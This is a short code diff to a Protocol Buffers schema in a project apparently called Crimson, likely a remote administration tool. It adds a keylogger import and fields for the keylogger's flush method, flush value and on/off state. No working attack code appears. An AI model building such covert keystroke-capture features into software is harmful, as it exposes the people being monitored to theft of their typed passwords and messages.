@@ -1,5 +1,6 @@
 package com.subterranean_security.crimson.core.proto;
 
+import "net/sequences/Keylogger.proto";
 import "net/sequences/Listener.proto";
 import "net/sequences/Users.proto";
 import "net/misc/Misc.proto";
@@ -61,6 +62,11 @@ message EV_ProfileDelta {
 	// Location
 	optional string country = 40;
 	optional string countryCode = 41;
+	
+	// Keylogger options
+	optional FLUSH_METHOD flush_method = 43;
+	optional int32 flush_value = 44;
+	optional State keylogger_state = 45;
 	
 }
 
